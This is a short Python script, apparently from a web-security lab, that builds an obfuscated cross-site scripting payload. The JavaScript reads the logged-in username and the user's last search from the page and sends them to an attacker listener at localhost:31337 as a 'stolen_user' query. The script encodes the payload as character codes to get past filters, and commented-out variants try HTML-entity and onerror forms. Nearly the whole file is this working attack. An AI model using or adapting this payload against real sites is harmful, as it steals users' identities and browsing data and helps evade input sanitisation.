import string
# stri = "hello"
# stri = "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}"
# stri = "onerror = " + "window.onload = function() { var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url);}"
stri = "$(function(){ var username = document.getElementById('logged-in-user').innerHTML; var last_search = document.getElementById('history-list').childNodes[1].innerHTML; var url = 'http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search; $.get(url, function(data){});});"


# print(stri)
# c = ''
# stri = ''.join('&#00000%d' % ord(x) for x in stri if x in ["'",'"',";"])
# stri = ''.join('&#00000%d' % ord(x) if ord(x) < 99 else '&#0000%d' % ord(x) for x in stri)

stri = ''.join(',%d' % ord(x) for x in stri)


# print(c)
# temp1 = ''
# temp2 = ''


# numList = ['0','1','2','3','4','5','6','7','8','9']

# for i in range(0,len(c)-2):
#     if (c[i] and c[i+1] and c[i+2]) in numList:
#         temp1 = c[:i]
#         temp2 = c[i:]
#         c = temp1 + '0000' + temp2
#         # print(c[i:i+4])
#     if (c[i] and c[i+1]) in numList:
#         temp1 = c[:i]
#         temp2 = c[i:]
#         c = temp1 + '0000' + temp2



print("new: ",stri)
